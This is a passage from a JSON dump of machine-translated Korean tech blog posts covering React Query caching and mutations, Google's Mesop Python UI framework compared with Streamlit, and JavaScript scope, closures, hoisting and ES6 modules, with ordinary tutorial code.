refetch: API 호출을 수동으로 트리거할 수 있는 함수입니다.\n\n그리고 더 많은 속성이 있는데, 자세한 내용은 여기를 참조해주세요.\n\n# 메모\n\n<div class=\"content-ad\"></div>\n\n쿼리 키는 적절한 캐싱과 재검색을 보장하기 위해 고유해야 합니다. 내부적으로 배열로 변환되어 키-값 쌍과 유사합니다.\n\n- 예를 들어, useQuery(`Todo`, fetchTodo) 는 키 `Todo`로 결과를 저장합니다.\n- useQuery([`Todo`, 1], () => fetchTodo(1)) 는 키 [`Todo`, 1] 로 결과를 저장합니다.\n\n이 두 캐시는 별개입니다. 의존성 목록에 거짓값이 포함되어 있다면 쿼리 함수가 호출되지 않습니다.\n\n다른 queryFunctions에 동일한 queryKey를 사용하면 해당 키 아래에 가장 최근 결과가 저장되어 잠재적인 문제를 야기할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\nUseMutation은 변경 작업(데이터 수정 작업)을 관리하는 강력한 훅입니다. 이를 통해 백엔드 API로 변이를 보내고 응답을 처리하는 프로세스가 간단해집니다.\n\n![이미지](/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_3.png)\n\nuseMutation에서 반환된 옵션과 객체는 거의 비슷하지만 refetch 대신 mutate를 반환하며 useMutation에는 queryKey가 없습니다. 왜냐하면 이들은 데이터 수정 작업이기 때문입니다.\nmutate는 변이를 시작하는 데 사용되는 함수입니다. 데이터 변이 함수로 보낼 데이터를 나타내는 선택적 페이로드를 인수로 받습니다.\n옵션 및 속성에 대한 자세한 내용은 이 링크를 참조하세요.\n\nuseMutation 및 useQuery를 활용한 예제를 살펴보겠습니다.\n\n<div class=\"content-ad\"></div>\n\n낙관적인 업데이트\n\n참고 - 이것은 일반적으로 대부분의 프로젝트에서 객체를 생성할 때 백엔드에서 id가 생성되기 때문에, 패치, 삭제 및 업데이트에 대해서만 작동합니다.\n\n위 예시를 고려해 봅시다. 할 일이 삭제되면 현재 2개의 작업이 발생합니다 -\n1. 할 일 ID로 삭제 호출.\n2. 즉시 업데이트된 할 일 목록 보여주기 위해 get 호출.\n\n이전 get API가 호출될 때, 응답과 함께 데이터가 캐시에 저장됩니다.\n우리가 해야 할 일은 캐시를 업데이트하는 것뿐입니다(캐시에서 항목에 기반한 할 일 항목 제거).\n\n<div class=\"content-ad\"></div>\n\n리액트 쿼리는 setQueryData를 사용하여 수동으로 캐시 관리하는 것보다 더 간편한 방법을 제공하여 캐시된 데이터를 업데이트할 수 있습니다. 이 방법을 사용하면 특정 쿼리 키와 연관된 데이터를 직접 수정할 수 있습니다.\n이에 대한 2가지 경우가 있습니다 -\n\n삭제 API 호출의 성공 후 캐시 업데이트\n이 경우, 삭제 API 호출이 성공한 경우에 캐시를 업데이트합니다.\n\n![이미지](/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_4.png)\n\nAPI 호출 전에 캐시 업데이트\n이 경우, API 호출이 성공할 것으로 가정하고 onMutate 함수를 사용하여 데이터를 업데이트합니다.\nonMutate은 변이가 발생하기 전에 실행됩니다. 따라서 여기서 todoItem을 삭제하고 있습니다.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_5.png\" />\n\n참고 -\n불변 업데이트: 항상 캐시 데이터를 불변하게 업데이트합니다. React Query는 기존 데이터를 직접 수정하는 대신 새로운 데이터 객체를 기대합니다.\n쿼리 키: 관련 캐시 항목을 대상으로 정확한 쿼리 키를 지정합니다.\n\n이 블로그에서는 React Query의 강력한 기능에 대해 살펴보았습니다. 특히 React 애플리케이션에서 데이터 가져오기와 관리를 최적화하기 위해 캐싱을 활용하는 방법에 중점을 두었습니다. React Query의 내부 메커니즘을 이해함으로써 QueryClient, QueryCache, MutationCache 및 QueryObservers와 같은 요소를 통해 개발자들은 API 요청을 효율적으로 처리하고 애플리케이션 성능을 향상시키며 애플리케이션 전체에서 데이터 일관성을 보장할 수 있습니다.\n\nuseQuery 및 useMutation 훅의 사용을 탐구하며 각각 데이터 가져오기 및 변이에 대한 역할을 강조했습니다. 게다가 낙관적 업데이트의 중요성을 논의하면서 사용자 경험을 향상시킬 수 있는 방법을 살펴보았습니다. 서버 확인을 기다리는 동안 즉각적인 피드백을 제공함으로써 사용자 경험을 향상시킬 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\nReact Query를 다룬 이번 내용이 유익하고 실용적이었기를 바라요. React 애플리케이션을 최적화하는 더 많은 팁과 기술에 대한 소식을 기대해 주세요. 이 블로그가 유용하다면 공유하고 더 많은 콘텐츠를 구독해 주세요. 즐거운 코딩하세요!","ogImage":{"url":"/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_0.png"},"coverImage":"/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_0.png","tag":["Tech"],"readingTime":6},{"title":"구글이 Streamlit을 죽였는가","description":"","date":"2024-06-27 18:19","slug":"2024-06-27-DidGoogleJustKillStreamlit","content":"\n\n## 구글의 Mesop 프레임워크를 살펴보면 Streamlit보다 더 나은지 확인해보세요.\n\n내가 소파에 앉아 YouTube의 추천을 살펴보던 중 Google의 최신 오픈 소스 파이썬 프레임워크인 'Mesop'에 관한 Prompt Engineering의 비디오를 보게 되었습니다. 구글 팀이 내부 도구 및 빠른 프로토타이핑에 사용하는 'Mesop'라는 프레임워크입니다. 'Mesop'이 무엇을 의미하는지 궁금하다면, 너무 깊게 생각하지 마세요. 삶에는 모든 것이 의미가 있는 것은 아닙니다. 이 글을 읽는 Will이 있다면 아래 댓글에 남겨주세요.\n\n아마 Mesop을 시도해보고 Streamlit보다 실제로 더 나은지 확인해봐야겠다고 생각했습니다. Streamlit은 코드 작성 경험이 매우 직관적하고 마법 같이 순식간에 앱을 생성할 수 있는 능력 때문에 정말 좋아합니다. 하지만 그 인터페이스를 보자마자 Streamlit임을 알 수 있습니다.\n\n이 문제에 대처하기 위해 Python과 Tailwind CSS만 사용하여 아름다운 웹 앱을 개발하는 방법에 대해 작성한 블로그가 예상치 못하게 터져나왔습니다. 여기서 읽을 수 있습니다. 이 과정은 훨씬 더 제작 친화적이지만, 사용자 정의 가능한 프로토타입을 개발하려면 어떨까요?\n\n<div class=\"content-ad\"></div>\n\n당신이 바로 Mesop이 하는 일입니다.\n\n간략히 요약하면, Mesop은 아직 초기 단계에 있으므로 그것을 기반으로 SaaS 스타트업을 구축하기 위해 키보드로 코딩을 시작하지 마세요. 또한 Google에서 공식적으로 지원하지는 않습니다.\n\n# Mesop의 기능\n\n- 오픈 소스.\n- 미리 구축된 구성 요소로 시작하기 쉽습니다.\n- Python에서 작성된 자연스러운 코드.\n- 핫 리로드.\n- 구성 요소는 기본적으로 Python 함수입니다.\n- Angular로 구축되었습니다.\n\n<div class=\"content-ad\"></div>\n\n# Mesop 시작하기\n\n안녕하세요! 메소프 기술의 다양한 기능에 대한 장황한 문학작품으로 사람들을 지루하게 만드는 것을 싫어하기 때문에, 메소프로 기본 UI를 만드는 것으로 바로 도입하겠습니다. 메소프로 작업할 때 알아두어야 할 주요한 세 가지 구성 요소가 있습니다:\n\n- 상태 클래스: 이는 세션의 상태 역할을 하며 다른 구성 요소 간에 데이터를 공유하는 능력을 제공합니다.\n- 페이지 및 이벤트: 앱의 주요 UI입니다.\n- 스타일링 요소: CSS 스타일 (Tailwind 지원은 아직 제공되지 않습니다)\n\n시작하기 전에 pip install mesop을 사용해서 메소프를 설치해보세요. 함께 즐거운 개발 시간 보내시길 바랍니다!\n\n<div class=\"content-ad\"></div>\n\n## State 클래스\n\n앱 내에서 사용되는 모든 모델은 데코레이터 @me.stateclass를 사용하여 state 클래스를 인스턴스화하는 데 사용됩니다. 예를 들어, 제목과 개요를 사용하여 기사를 생성하는 GenAI 앱을 개발 중이라고 가정해보겠습니다. 'Article'이라는 이름의 state 클래스를 생성해야 합니다. 해당 state 클래스는 다음과 같이 보일 것입니다:\n\n```js\nimport mesop as me\n\n@me.stateclass\nclass Article:\n    title: str\n    outline: str\n    response: str\n```\n\n우리가 생성하는 각 함수나 구성 요소에서 이 state 클래스 데이터는 유지되며 전역적으로 액세스할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n## 페이지 및 이벤트\n\n모든 페이지는 Mesop에서 @me.page() 데코레이터를 사용하여 태그가 지정됩니다.\n\n```js\n@me.page()\ndef app():\n    me.input(label=\"제목\", type=\"text\")\n    me.input(label=\"개요\", type=\"text\")\n```\n\n위의 코드는 두 개의 입력 필드가 있는 기본 페이지를 생성합니다. 이전에 만든 상태 클래스에 데이터를 저장할 수 있도록 각 필드에는 별도의 함수가 필요합니다.\n\n<div class=\"content-ad\"></div>\n\n```js\ndef on_title_input(title: me.InputEvent):\n    s = me.state(Article)\n    s.title = title.value\n\ndef on_outline_input(outline: me.InputEvent):\n    s = me.state(Article)\n    s.outline = outline.value\n\n@me.page()\ndef app():\n    me.input(label=\"Title\", on_input=on_title_input, type=\"text\")\n    me.input(label=\"Outline\", on_input=on_outline_input, type=\"text\")\r\n```\n\n상태 클래스에 액세스하려면 me.state() 함수를 사용합니다. 그 인스턴스는 변수 s에 저장됩니다.\n\nMesop에서 이벤트는 InputEvent, ClickEvent 등의 클래스를 사용하여 처리됩니다.\n\n클릭 이벤트를 처리하기 위해 다른 함수를 호출하여 입력 데이터를 제출할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\n# 응답 스키마\nclass Blog(typing_extensions.TypedDict):\n    title: str\n    content: str\n\ndef on_title_input(title: me.InputEvent):\n    s = me.state(Article)\n    s.title = title.value\n\ndef on_outline_input(outline: me.InputEvent):\n    s = me.state(Article)\n    s.outline = outline.value\n\ndef on_click(click: me.ClickEvent):\n    s = me.state(Article)\n    prompt = f\"다음 기사 제목 및 개요를 사용하여 블로그를 작성해주세요: <article_title>{s.title}</article_title><article_outline>{s.outline}</article_outline>. 최종 블로그와 제목을 마크다운 형식으로 반환하세요.\"\n    # 훅 URL을 저장할 환경 변수 추가\n    response = model.generate_content(\n                prompt,\n                generation_config=genai.GenerationConfig(\n                    response_mime_type=\"application/json\",\n                    response_schema=Blog,\n                    temperature=0.8\n                ))\n    data = json.loads(response.text)\n    s.response = data\n\n@me.page()\ndef app():\n    me.input(label=\"제목\", on_input=on_title_input, type=\"text\")\n    me.input(label=\"개요\", on_input=on_outline_input, type=\"text\")\n    me.button(\"블로그 생성\", on_click=on_click)\r\n```\n\n재미있는 일을 위해 Mesop을 사용하여 Gemini 모델을 활용해 블로그를 생성할 것입니다. on_click 함수는 Article 인스턴스로부터 data s.title과 s.outline를 가져와서 만든 prompt에 주입할 것입니다. LLM의 응답은 블로그 내용을 담은 JSON일 것입니다.\n\n## 스타일링\n\nMesop에서 요소를 스타일링하는 것은 기존 CSS 속성과 유사하지만, 모든 속성은 me.style()의 매개변수입니다.\n\n\n<div class=\"content-ad\"></div>\n\nme.style()을 사용하여 스타일을 정의한 후, 해당 스타일을 변수에 저장하여 컴포넌트에서 매개변수로 호출할 수 있습니다.\n\n```js\n_STYLE_INPUT_WIDTH = me.Style(width=\"100%\")\n\n_STYLE_BUTTON = me.Style(\n    background=\"#1976D2\",\n    color=\"#fff\",\n    padding=me.Padding.symmetric(horizontal=20, vertical=10),\n    font_size=\"16px\",\n    cursor=\"pointer\",\n    margin=me.Margin(bottom=20),\n)\n\n@me.page()\ndef app():\n    with me.box(style=_STYLE_CONTAINER):\n        s = me.state(Article)\n        with me.box(style=_STYLE_MAIN_COLUMN):\n            me.input(label=\"Title\", on_input=on_title_input, type=\"text\", style=_STYLE_INPUT_WIDTH)\n            me.input(label=\"Outline\", on_input=on_outline_input, type=\"text\", style=_STYLE_INPUT_WIDTH)\n            me.button(\"Generate Blog\", on_click=on_click, style=_STYLE_BUTTON)\n    with me.box(style=_STYLE_PREVIEW_CONTAINER):\n        if s.response:\n            me.markdown(f\"{s.response['content']}\", style=_STYLE_PREVIEW)\n```\n\n# 최종 인터페이스\n\n<img src=\"/assets/img/2024-06-27-DidGoogleJustKillStreamlit_0.png\" />\n\n<div class=\"content-ad\"></div>\n\n안녕하세요! 테이블 태그를 마크다운 형식으로 변경해 드릴게요. \n\n\n| Not the best-looking UI, but that’s because I didn’t make the effort to style it enough. It still looks a lot better than raw HTML with just a few tweaks here and there. With the ability to use all CSS properties for the components, you can make the UI unique. |\n\n# Is Streamlit dead?\n\nNo, absolutely not. Mesop is still under development, and the documentation lacks in certain aspects. Deploying a Mesop application is not straightforward and requires containerization unless you are deploying it directly to Google Cloud.\n\nStreamlit still comes with its own set of benefits and is fundamentally stronger compared to Mesop, especially if you are looking to build something in the data visualization domain. Moreover, Streamlit Cloud is a boon for anyone looking to share their applications absolutely free of charge.\n\n\n무엇이든 더 도와드릴게요!\n\n<div class=\"content-ad\"></div>\n\n그러나 Mesop은 성장 잠재력이 있으며 매일 업데이트를 받고 있어 가벼운 성격으로 REST API에서 작동하는 빠른 도구 및 간단한 프로토 타입에 더 적합해지고 있습니다.\n\nMesop의 Will과 다른 기여자들에게 시간과 노력을 들여 이러한 프레임워크를 개발하고 유지하는 데 기쁨을 느낍니다.\n\n# 더 많은 UI 프레임워크가 필요합니다\n\nStreamlit, Nicegui, Gradio 그리고 이제 Mesop와 같은 새로운 Python UI 프레임워크가 등장하는 것을 항상 좋게 생각합니다. Python의 관용구 문법은 코딩을 훨씬 더 접근 가능하게 만들어주며, 이는 지금 Streamlit 프로젝트의 많은 수로부터 명확히 확인됩니다.\n\n<div class=\"content-ad\"></div>\n\n행운이던지 불행이던지, 파이썬이 내가 처음으로 배운 프로그래밍 언어였고, 그것에 즉시 사랑에 빠졌어요. 이와 같은 더 많은 프레임워크로 인해, Python은 사용량이 급격히 증가할 것이고, 미래에는 더 많은 실무급 Python 앱들을 볼 수 있기를 희망해요.\n\n저는 Mesop에 관한 이 짧은 블로그를 좋아해주셨으면 좋겠어요. 더 깊이 파고들고 싶었지만, 제한된 시간 때문에 글을 짧게 유지하게 된 것과, 우리 모두가 금붕어 수준의 집중력을 고려했기 때문이에요. 만약 이 글에 박수를 보내주시고, 파이썬과 Google 커뮤니티의 더 많은 사용자와 공유해주시고, 앞으로의 다른 글들을 위해 팔로우해주시면 정말 감사하겠어요.\n\n# 링크\n\n- Github\n- Mesop","ogImage":{"url":"/assets/img/2024-06-27-DidGoogleJustKillStreamlit_0.png"},"coverImage":"/assets/img/2024-06-27-DidGoogleJustKillStreamlit_0.png","tag":["Tech"],"readingTime":7},{"title":"JS 초보자를 위한 가이드 Part 1  스코프, 클로저, 호이스팅, 모듈 이해하기","description":"","date":"2024-06-27 18:16","slug":"2024-06-27-YoudontknowJSPart1UnderstandingScopeClosureHoistingModules","content":"\n\n![이미지](/assets/img/2024-06-27-YoudontknowJSPart1UnderstandingScopeClosureHoistingModules_0.png)\n\n- Scope: 변수에 대한 접근 가능성을 정의하며, 코드 내에서 어디에서 접근할 수 있는지를 나타냅니다.\n- Closure: 실행 범위 외부에서 실행되더라도 어휘적 범위를 기억하는 함수입니다.\n- 호이스팅은 JavaScript 메커니즘으로, 변수 및 함수 선언이 코드의 선언 위치와 관계없이 컴파일 단계 중에 해당 범위의 맨 위로 이동됩니다. 이는 변수 및 함수가 선언되기 전에 사용될 수 있다는 것을 의미합니다.\n\n명령형(어떻게, 무엇) 대 선언형(무엇)\n명령형 - 작동 방식을 알고 작동 방식을 알 수 있습니다.\n선언형 - 작동 방식을 알지 못한 채, 무엇이 동작하는지만 알 수 있습니다. JS 배열 맵 함수와 같은 예시\n\n![이미지](/assets/img/2024-06-27-YoudontknowJSPart1UnderstandingScopeClosureHoistingModules_1.png)\n\n<div class=\"content-ad\"></div>\n\nScope 이전에 JS에서 변수를 선언하는 방법을 먼저 이해해야 합니다.\nlet vs var vs const\n\n![이미지](/assets/img/2024-06-27-YoudontknowJSPart1UnderstandingScopeClosureHoistingModules_2.png)\n\nScope는 변수의 접근 가능성(가시성)을 결정합니다. JavaScript에는 3가지 유형의 scope가 있습니다: ES6(2015) 이전에는 JavaScript에서 전역 Scope 및 함수 Scope만 있었지만, 블록 Scope는 나중에 let과 const로 도입되었습니다.\n\n- 전역 Scope: 어떤 함수 내에서도 선언되지 않은 변수들은 전역 Scope를 갖습니다.\n프로그래밍 환경에서 전역 Scope는 모든 다른 Scope에서 볼 수 있는 Scope입니다. 이는 브라우저에서는 window 객체에 연결되고 Node.js에서는 전역(global)에 연결됩니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar globalVar = 10;  \nfunction foo() {     \n   console.log(globalVar); // 사용 가능 \n   console.log(window.globalVar); // 사용 가능\n}  \nconsole.log(globalVar);\nconsole.log(window.globalVar);\nfoo(); // 출력: 10 10 10 10\n```\n\n2. 지역 범위: 함수 내에서 선언된 변수는 지역 범위를 갖습니다.\n함수 내에서 선언된 변수를 지역 변수라고 하며 함수 범위에 속합니다. 지역 변수는 함수 내 어디에서든 접근할 수 있습니다 (기능 블록 내).\n\n```js\nfunction foo() {     \n   var localVar = 20;    \n   if(true){\n   var blocklocalVar = 2\n    } \n   console.log(localVar); // 사용 가능 \n   console.log(blocklocalVar) // var의 함수 범위 때문에 접근 가능\n }  \nfoo(); \n\nconsole.log(localVar);\n// 출력: 20 2\n// 오류: localVar이(가) 정의되지 않았습니다\n```\n\n3. 블록 범위: let과 const는 블록 범위 변수이며, if, for, while 등의 블록을 기준으로 합니다.\n\n<div class=\"content-ad\"></div>\n\nES6는 JavaScript에 let 및 const라는 두 가지 중요한 새로운 키워드를 소개했습니다. 이 두 키워드는 JavaScript에서 블록 범위를 제공합니다. ' ' 블록 내에서 선언된 변수는 블록 외부에서 액세스할 수 없습니다. 예: If else 블록, for 루프 블록 등\n\n예시 (let을 사용한 블록 스코프):\n\n```js\nfunction example() {\n  if (true) {\n    let blockVar = '블록 내부에 있어요';\n    console.log(blockVar); // 접근 가능\n  }\n  console.log(blockVar); // 오류: blockVar가 정의되지 않았습니다\n}\nexample();\n```\n\n- 예시 (const를 사용한 블록 스코프):\n\n<div class=\"content-ad\"></div>\n\n```js\nfunction example() {\n  const PI = 3.14;\n  if (true) {\n    const blockConst = 'I am inside a block';\n    console.log(PI); // Accessible\n    console.log(blockConst); // Accessible\n  }\n  console.log(PI); // Accessible\n  console.log(blockConst); // Error: blockConst is not defined\n}\nexample();\n```\n\n만약 var를 사용한다면 (함수 스코프)\n\n```js\nfunction example() {\n  const PI = 3.14;\n  if (true) {\n    var blockConst = 'I am inside a block';\n    console.log(PI); // Accessible\n    console.log(blockConst); // Accessible\n  }\n  console.log(PI); // Accessible\n  console.log(blockConst); // Error: blockConst is not defined\n}\nexample();\n3.14\nI am inside a block\n3.14\nundefined\n```\n\n```js\nfunction outer() {\n  var outerVar = 'I am outer';\n  function inner() {\n    console.log(outerVar); // Accessible\n  }\n  inner();\n}\nouter(); // 출력: I am outer\n```\n\n<div class=\"content-ad\"></div>\n\n범위의 예시\n\n1. (let을 사용한 루프 변수 범위): 블록\n\n```js\nfor (let i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 100);\n}\n// 결과: 0\n// 결과: 1\n// 결과: 2\n```\n\n2. var를 사용한 루프 변수 범위: 함수 또는 전역 범위\n\n```js\nfor (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 100);\n}\n// 결과: 3\n// 결과: 3\n// 결과: 3\n```\n\n<div class=\"content-ad\"></div>\n\n3. 중첩된 블록 내에서 let으로 재선언: 블록 스코프\n\n```js\nfunction example() {\n  let x = 10;\n  if (true) {\n    let x = 20;\n  }\n  console.log(x); // 출력: 10\n}\nexample();\n```\n\n4. 중첩된 블록 내에서 var로 재선언: 함수 또는 전역 스코프\n\n```js\nfunction example() {\n  var x = 10;\n  if (true) {\n    var x = 20;\n  }\n  console.log(x); // 출력: 20\n}\nexample();\n```\n\n<div class=\"content-ad\"></div>\n\n5. var 및 let을 사용한 호이스팅:\n\n```js\nconsole.log(x); // 결과: undefined\nvar x = 10;\n```\n\n```js\nconsole.log(x); // 오류: 초기화 전에 'x'에 액세스할 수 없음\nlet x = 10;\n```\n\n6. let 및 const를 사용한 블록 스코프:\n\n<div class=\"content-ad\"></div>\n\n```js\nfunction example() {\n  if (true) {\n    const x = 10;\n    console.log(x); // 출력: 10\n  }\n  console.log(x); // 오류: x가 정의되지 않았습니다\n}\nexample();\n```\n\n\n## 2. 클로저:\n\n- 정의: 클로저는 함수가 다른 곳에서 실행되더라도 주변 변수를 \"기억\"하는 것을 말합니다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\nfunction outer() {     \n  var outerVar = 'I am outer';      \n  function inner() {         \n   console.log(outerVar); // outer 함수 외부에서도 호출될 때 접근 가능     \n  }      \n return inner; // inner 함수 반환 \n}  \nvar closureFunc = outer(); // outer 실행, inner 반환 \nclosureFunc(); // 출력: I am outer\n```\n\n2. Loop & Closure: 클로저를 사용하는 루프에서 흔히 범하는 함정.\n\n```js\nfunction createFuncArray() {     \nvar funcArray = [];      \nfor (var i = 0; i < 5; i++) {         \n  funcArray.push(function() {            \n  console.log(i); // 항상 5를 출력하며, 0, 1, 2, 3, 4가 아님        \n });    \n }      \nreturn funcArray; \n}  \nvar myFuncArray = createFuncArray(); \nmyFuncArray[0](); // 출력: 5\n```\n\n루프 예제의 함정을 피하려면, IIFE(즉시 실행 함수 표현)를 사용하여 각 반복마다 클로저를 생성할 수 있습니다:\n\n<div class=\"content-ad\"></div>\n\n```javascript\nfunction createFuncArray() {\n   var funcArray = [];\n   for (var i = 0; i < 5; i++) {\n       (function(num) {\n           funcArray.push(function() {\n               console.log(num);\n           });\n       })(i);\n   }\n   return funcArray;\n}\nvar myFuncArray = createFuncArray();\nmyFuncArray[0](); // 출력: 0\n```\n\n자바스크립트를 마스터하기 위해서는 스코프와 클로저를 이해하는 것이 기본이 됩니다. 이러한 예제들은 좋은 시작점이 될 것입니다!\n\n3.\n\n```javascript\nfunction makeCounter() {\n    var count = 0;\n\n    return function() {\n        return ++count;\n    };\n}\n\nvar counter1 = makeCounter();\nconsole.log(counter1()); // 출력: 1\nconsole.log(counter1()); // 출력: 2\n\nvar counter2 = makeCounter();\nconsole.log(counter2()); // 출력: 1 (다시 1부터 시작)\n```\n\n<div class=\"content-ad\"></div>\n\n이 예제에서:\n\n- makeCounter() 함수는 카운트 변수를 증가시키고 반환하는 내부 함수를 반환합니다.\n- makeCounter()가 호출될 때마다, 자체 카운트 변수를 가진 새로운 렉시컬 환경이 생성되며, 이는 외부 스코프에서 숨겨져 있습니다.\n- counter1과 counter2가 호출될 때, 각각 자체 독립적인 카운트 변수를 가지며, 각각 자체 상태를 독립적으로 유지합니다.\n- 클로저는 내부 함수가 makeCounter() 실행이 끝난 후에도 포함된 스코프의 카운트 변수에 접근할 수 있도록 형성됩니다.\n\n클로저 스코프 체인\n\n모든 클로저에는 세 가지 스코프가 있습니다:\n\n<div class=\"content-ad\"></div>\n\n- 지역 스코프 (자체 스코프)\r\n- 포함 스코프 (블록, 함수 또는 모듈 스코프가 될 수 있음)\r\n- 전역 스코프\n\n```js\n// 전역 스코프\nconst e = 10;\nfunction sum(a) {\n  return function (b) {\n    return function (c) {\n      // 외부 함수 스코프\n      return function (d) {\n        // 지역 스코프\n        return a + b + c + d + e;\n      };\n    };\n  };\n}\nconsole.log(sum(1)(2)(3)(4)); // 20을 출력합니다.\n```\n\n- 호이스팅\n호이스팅은 변수와 함수의 값을 초기화/할당하기 전에도 변수와 함수의 값을 추출할 수 있게 해주는 개념으로, 이는 실행 컨텍스트의 첫 번째 단계 (메모리 생성 단계 또는 생성 단계)로 인해 발생합니다.\n- JavaScript에서 호이스팅은 기본 동작으로 모든 선언을 코드 실행 전에 해당 범위의 맨 위로 이동시키는 것입니다. 기본적으로 함수와 변수가 선언된 위치와 상관없이 해당 범위의 맨 위로 이동되기 때문에 전역이든 지역이든 상관없이 우리에게 이점을 제공합니다.\n- 참고: JavaScript는 선언을 호이스트하지만 초기화는 호이스트하지 않습니다.\n- JavaScript는 프로그램에서 정의된 모든 변수와 함수에 대해 실행 전에 메모리를 할당합니다.\n\n1. var로 호이스팅:\n\n<div class=\"content-ad\"></div>\n\n- 예제 1: 변수 선언 호이스팅\n\n```js\nconsole.log(x); // 결과: undefined\nvar x = 10;\n```\n\n- 예제 2: 함수 선언 호이스팅\n\n```js\nhoistedFunction(); // 결과: \"호이스팅된 함수\"\nfunction hoistedFunction() {\n  console.log(\"호이스팅된 함수\");\n}\n```\n\n<div class=\"content-ad\"></div>\n\n2. let으로 호이스팅:\n\n- 예제 3: 변수 선언 호이스팅\n\n```js\nconsole.log(x); // 오류: 초기화 전에 'x'에 액세스할 수 없음\nlet x = 10;\n```\n\n- 예제 4: 함수 선언 호이스팅 없음\n\n<div class=\"content-ad\"></div>\n\n```js\nnotHoistedFunction(); // 에러: notHoistedFunction이 정의되지 않았습니다.\nlet notHoistedFunction = function() {\n  console.log(\"호이스팅되지 않은 함수\");\n}\n```\n\n3. const로 호이스팅:\n\n- 예제 5: 변수 선언 호이스팅\n\n```js\nconsole.log(x); // 에러: 초기화 전에 'x'에 접근할 수 없음\nconst x = 10;\n```\n\n<div class=\"content-ad\"></div>\n\n4. 함수 스코프에서 호이스팅:\n\n- 예제 6: 함수 내부의 호이스팅\n\n```js\nfunction example() {\n  console.log(innerVar); // 출력: undefined\n  var innerVar = '내부 변수';\n  console.log(innerVar); // 출력: 내부 변수\n}\nexample();\n```\n\n- 예제 7: 블록 내부의 호이스팅 (let 및 const로 호이스팅 없음)\n\n<div class=\"content-ad\"></div>\n\n```js\nfunction example() {\n  console.log(innerLetVar); // 오류: 초기화되기 전에 'innerLetVar'에 액세스할 수 없습니다\n  let innerLetVar = '내부 let 변수';\n  console.log(innerLetVar); // 위의 오류로 이 줄은 실행되지 않습니다\n}\nexample();\r\n\r\n5. 중첩된 스코프에서 호이스팅:\n\n- 예제 8: 중첩된 함수에서 호이스팅\n\nfunction outer() {\n  console.log(outerVar); // 결과: 정의되지 않음\n  var outerVar = '바깥 변수';\n  inner();\n  function inner() {\n    console.log(outerVar); // 결과: 바깥 변수\n  }\n}\nouter();\n\n<div class=\"content-ad\"></div>\n\n6. 함수 표현식을 이용한 호이스팅:\n\n- 예시 9: 함수 표현식 호이스팅\n\nvar myFunc = function() {\n  console.log(\"함수 표현식\");\n};\nmyFunc(); // 출력: 함수 표현식\n\n7. 다른 스코프 유형에서의 호이스팅:\n\n<div class=\"content-ad\"></div>\n\n- 예제 10: 전역 범위에서 호이스팅\n\nconsole.log(globalVar); // 출력: undefined\nvar globalVar = '전역 변수';\nconsole.log(globalVar); // 출력: 전역 변수\n\n4. ES6 모듈\n모듈을 사용하면 코드를 별도의 파일로 캡슐화하고 그들 간에 기능을 import/export할 수 있습니다.\n\n기본 모듈 내보내기:\n\n<div class=\"content-ad\"></div>\n\n// moduleA.js\nexport function greet() {\n  console.log('Hello');\n}\n\n// main.js\nimport { greet } from './moduleA.js';\ngreet(); // Output: Hello\n\n2. Default Exports:\n\n// moduleB.js\nexport default function greet() {\n  console.log('Hello');\n}\n\n<div class=\"content-ad\"></div>\n\n// main.js\nimport greet from './moduleB.js';\ngreet(); // 출력: Hello\n\n3. 별칭이 지정된 Named Exports:\n\n// moduleC.js\nexport { greet as hello };\n\n// main.js\nimport { hello } from './moduleC.js';\nhello(); // 출력: Hello\n\n<div class=\"content-ad\"></div>\n\n4. 여러 값을 내보내기:\n\n// moduleD.js\nexport function greet() {\n  console.log('Hello');\n}\nexport const PI = 3.14;\n\n// main.js\nimport { greet, PI } from './moduleD.js';\ngreet(); // 결과: Hello\nconsole.log(PI); // 결과: 3.14\n\n<div class=\"content-ad\"></div>\n\n```\n// moduleE.js\nexport default function greet() {\n  console.log('Hello');\n}\nexport const PI = 3.14;\n\n\n\n// main.js\nimport greet, { PI } from './moduleE.js';\ngreet(); // Output: Hello\nconsole.log(PI); // Output: 3.14\n\n\n6. Importing All Exports:\n\n\n// moduleF.js\nexport function greet() {\n  console.log('Hello');\n}\nexport const PI = 3.14;\n\n\n<div class=\"content-ad\"></div>\n\n```js\n// main.js\nimport * as moduleF from './moduleF.js';\nmoduleF.greet(); // 출력: Hello\nconsole.log(moduleF.PI); // 출력: 3.14\n```\n\n7. 부수 효과용 모듈 가져 오기:\n\n```js\n// moduleG.js\nconsole.log('Module G가 로드되었습니다');\n```\n\n```js\n// main.js\nimport './moduleG.js'; \nconsole.log(\"Main.js 파일이 실행 중입니다\")\n// 출력: // 먼저 가져온 파일이 먼저 실행되어\nModule G가 로드되었습니다\nMain.js 파일이 실행 중입니다\n```\n\n<div class=\"content-ad\"></div>\n\n8. 다이나믹 Imports:\n\n```javascript\n// main.js\nconst moduleName = './moduleA.js';\nimport(moduleName).then(module => {\n  module.greet(); // 출력: Hello\n});\n```\n\n9. 모듈 재내보내기:\n\n```javascript\n// moduleH.js\nexport function greet() {\n  console.log('Hello');\n}\n```\n\n<div class=\"content-ad\"></div>\n\n```js\n// moduleI.js\nexport { greet } from './moduleH.js';\n// main.js\nimport { greet } from './moduleI.js';\ngreet(); // Output: Hello\n```\n\n10. Conditional Module Loading:\n\n```js\n// main.js\nif (condition) {\n  import('./moduleA.js').then(module => {\n    module.greet(); // Output: Hello\n  });\n} else {\n  import('./moduleB.js').then(module => {\n    module.greet(); // Output: Hi\n  });\n}\n```\n\n  `export default` 구문과 일반 `export` 구문은 JavaScript 모듈에서 값을 내보내는데 모두 사용됩니다. 그러나 다른 모듈에서 가져오고 사용하는 방법에는 차이가 있습니다.\n\n<div class=\"content-ad\"></div>\n\n1. export default:\n\n- export default을 사용하면 모듈에서 하나의 값을 내보낼 수 있습니다.\n- 기본 내보내기를 가져올 때는 가져온 값에 대해 원하는 이름을 